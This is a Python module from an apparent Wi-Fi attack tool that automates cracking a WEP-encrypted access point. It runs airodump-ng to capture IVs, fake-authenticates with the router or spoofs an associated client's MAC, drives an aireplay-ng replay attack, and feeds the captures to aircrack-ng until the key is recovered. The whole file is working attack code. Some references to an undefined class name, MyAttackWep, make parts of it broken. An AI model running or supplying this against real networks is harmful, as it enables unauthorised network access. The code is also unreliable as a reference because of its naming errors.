#!/usr/bin/env python
# -*- coding: utf-8 -*-

from masai.model.attack import Attack
from masai.model.crackresult import CrackResult
from masai.tools.airodump import Airodump
from masai.tools.aireplay import Aireplay, WEPAttackType
from masai.tools.aircrack import Aircrack
from masai.tools.ifconfig import Ifconfig
from masai.config import Configuration

import time

class AttackWep(Attack):
    '''
        Contains logic for attacking a WEP-encrypted access point.
    '''

    fakeauth_wait = 6

    def __init__(self, target):
        super(AttackWep, self).__init__(target)
        self.crack_result = None
        self.success = False

    def run(self):
        '''
            Initiates full WEP attack.
            Including airodump-ng starting, cracking, etc.
            Returns: True if attack is successful, false otherwise
        '''

        aircrack = None # Aircrack process, not started yet
        fakeauth_proc = None
        replay_file = None
        airodump_target = None

        previous_ivs = 0
        current_ivs = 0
        total_ivs = 0
        keep_ivs = Configuration.wep_keep_ivs

        client_count = 0

        # Clean up previous WEP sessions
        if keep_ivs:
            Airodump.delete_airodump_temp_files('wep')

        attacks = ['replay']

        # BIG try-catch to capture ctrl+c
        try:
            # Start Airodump process
            with Airodump(channel=self.target.channel,
                            target_bssid=self.target.bssid,
                            ivs_only=True, # Only capture IVs packets
                            skip_wps=True, # Don't check for WPS-compatibility
                            output_file_prefix='wep',
                            delete_existing_files=not keep_ivs) as airodump:

                print('\r{+} waiting for target to appear...')
                airodump_target = self.wait_for_target(airodump)
                client_count = len(airodump_target.clients)
                fakeauth_proc = None
                if self.fake_auth():
                    # We successfully authenticated!
                    # Use our interface's MAC address for the attacks.
                    client_mac = Ifconfig.get_mac(Configuration.interface)
                    # Keep us authenticated
                    fakeauth_proc = Aireplay(self.target, 'fakeauth')
                elif client_count == 0:
                    # Failed to fakeauth, can't use our MAC.
                    # And there are no associated clients. Use one and tell the user.
                    print('{!} {O}there are no associated clients{W}')
                    print('{!} {R}WARNING: {O}many attacks will not succeed' +
                                ' without fake-authentication or associated clients{W}')
                    client_mac = None
                else:
                    # Fakeauth failed, but we can re-use an existing client
                    client_mac = airodump_target.clients[0].station
                # Convert to WEPAttackType.
                
                wep_attack_type = WEPAttackType(attacks[0]) # Replay Attack

                # Start Aireplay process.
                aireplay = Aireplay(self.target,
                                    wep_attack_type,
                                    client_mac=client_mac,
                                    replay_file=replay_file)
                attack_name = wep_attack_type.name
                time_unchanged_ivs = time.time() # Timestamp when IVs last changed
                time_slow_start = time.time()
                last_ivs_count = 0

                # Loop until attack completes.

                while True:
                    airodump_target = self.wait_for_target(airodump)
                    
                    if client_mac is None and client_count > 0:
                        client_mac = airodump_target.clients[0].station
                    
                    client_count = len(airodump_target.clients)
                    
                    if keep_ivs and current_ivs > airodump_target.ivs:
                        # We now have less IVS than before; A new attack must have started.
                        # Track how many we have in-total.
                        previous_ivs += total_ivs
                    current_ivs = airodump_target.ivs
                    total_ivs = previous_ivs + current_ivs

                    status = '%d/{C}%d{W} IVs' % (total_ivs, Configuration.wep_crack_at_ivs)
                    if fakeauth_proc:
                        if fakeauth_proc and fakeauth_proc.status:
                            status += ', {G}fakeauth{W}'
                        else:
                            status += ', {R}no-auth{W}'
                    if aireplay.status is not None:
                        status += ', %s' % aireplay.status
                    print('WEP', airodump_target, '%s' % attack_name, status)

                    # Check if we cracked it.
                    if aircrack and aircrack.is_cracked():
                        (hex_key, ascii_key) = aircrack.get_key_hex_ascii()
                        bssid = airodump_target.bssid
                        if airodump_target.essid_known:
                            essid = airodump_target.essid
                        else:
                            essid = None
                        print('\n{+} {C}%s{W} WEP attack {G}successful{W}\n' % attack_name)
                        if aireplay: aireplay.stop()
                        if fakeauth_proc: fakeauth_proc.stop()
                       
                        Airodump.delete_airodump_temp_files('wep')

                        crack_result = {'bssid': self.target.bssid, 
                                                'essid': self.target.essid,
                                                'channel': self.target.channel,
                                                'status': 'success',
                                                'hexKey': hex_key,
                                                'asciiKey': ascii_key }
                        result = CrackResult()
                        result.set_result(attack_type='wep', crack_result=crack_result)
                        return result

                    if aircrack and aircrack.is_running():
                        # Aircrack is running in the background.
                        print('and {C}cracking{W}')

                    # Check number of IVs, crack if necessary
                    if total_ivs > Configuration.wep_crack_at_ivs:
                        if not aircrack or not aircrack.is_running():
                            # Aircrack hasn't started yet. Start it.
                            ivs_files = airodump.find_files(endswith='.ivs')
                            ivs_files.sort()
                            if len(ivs_files) > 0:
                                if not keep_ivs:
                                    ivs_files = ivs_files[-1]  # Use most-recent .ivs file
                                aircrack = Aircrack(ivs_files)

                        elif Configuration.wep_restart_aircrack > 0 and \
                                aircrack.pid.running_time() > Configuration.wep_restart_aircrack:
                            # Restart aircrack after X seconds
                            #print('\n{+} {C}aircrack{W} ran for more than {C}%d{W} seconds, restarting' % Configuration.wep_restart_aircrack)
                            aircrack.stop()
                            ivs_files = airodump.find_files(endswith='.ivs')
                            ivs_files.sort()
                            if len(ivs_files) > 0:
                                if not keep_ivs:
                                    ivs_files = ivs_files[-1]  # Use most-recent .ivs file
                                aircrack = Aircrack(ivs_files)

                    # Check if IVs stopped flowing (same for > N seconds)
                    if airodump_target.ivs > last_ivs_count:
                        time_unchanged_ivs = time.time()
                    elif Configuration.wep_restart_stale_ivs > 0 and \
                            attack_name != 'chopchop' and \
                            attack_name != 'fragment':
                        stale_seconds = time.time() - time_unchanged_ivs
                        if stale_seconds > Configuration.wep_restart_stale_ivs:
                            # No new IVs within threshold, restart aireplay
                            aireplay.stop()
                            print('\n{!} restarting {C}aireplay{W} after' +
                                        ' {C}%d{W} seconds of no new IVs'
                                            % stale_seconds)
                            aireplay = Aireplay(self.target, \
                                                wep_attack_type, \
                                                client_mac=client_mac, \
                                                replay_file=replay_file)
                            time_unchanged_ivs = time.time()
                        
                    last_ivs_count = airodump_target.ivs
                    time.sleep(1)
                    continue
                # End of big while loop
        except KeyboardInterrupt:
            crack_result = {'bssid': self.target.bssid, 
                                    'essid': self.target.essid,
                                    'channel': self.target.channel,
                                    'status': 'failure',
                                    'hexKey': None,
                                    'asciiKey': None}
            result = CrackResult()
            result.set_result(attack_type='wep', crack_result=crack_result)
            if fakeauth_proc: fakeauth_proc.stop()
            if len(attacks) == 0:
                if keep_ivs:
                    Airodump.delete_airodump_temp_files('wep')

                self.success = False
                return result
        except Exception as e:
            print(e)
            # End of big try-catch
        # End of for-each-attack-type loop

        if keep_ivs:
            Airodump.delete_airodump_temp_files('wep')

        self.success = False
        crack_result = {'bssid': self.target.bssid, 
                            'essid': self.target.essid,
                            'channel': self.target.channel,
                            'status': 'failure',
                            'hexKey': None,
                            'asciiKey': None}
        result = CrackResult()
        result.set_result(attack_type='wep', crack_result=crack_result)
        return result

    
    def fake_auth(self):
        '''
        Attempts to fake-authenticate with target.
        Returns: True if successful, False is unsuccessful.
        '''
        print('\r{+} attempting {G}fake-authentication{W} with {C}%s{W}...' % self.target.bssid)
        fakeauth = Aireplay.fakeauth(self.target, timeout=MyAttackWep.fakeauth_wait)
        if fakeauth:
            print(' {G}success{W}')
        else:
            print(' {R}failed{W}')
            if Configuration.require_fakeauth:
                # Fakeauth is required, fail
                raise Exception(
                    'Fake-authenticate did not complete within' +
                    ' %d seconds' % MyAttackWep.fakeauth_wait)
            else:
                # Warn that fakeauth failed
                print('{!} {O}' +
                    'unable to fake-authenticate with target' +
                    ' (%s){W}' % self.target.bssid)
                print('{!} continuing attacks because' +
                    ' {G}--require-fakeauth{W} was not set')
        return fakeauth


if __name__ == '__main__':
    Configuration.initialize(True)
    from masai.model.router import Router
    fields = 'A4:2B:8C:16:6B:3A, 2015-05-27 19:28:44, 2015-05-27 19:28:46,  6,  54e,WEP, WEP, , -58,        2,        0,   0.  0.  0.  0,   9, Test Router Please Ignore, '.split(',')
    target = Router(fields)
    wep = MyAttackWep(target)
    wep.run()
    Configuration.exit_gracefully(0)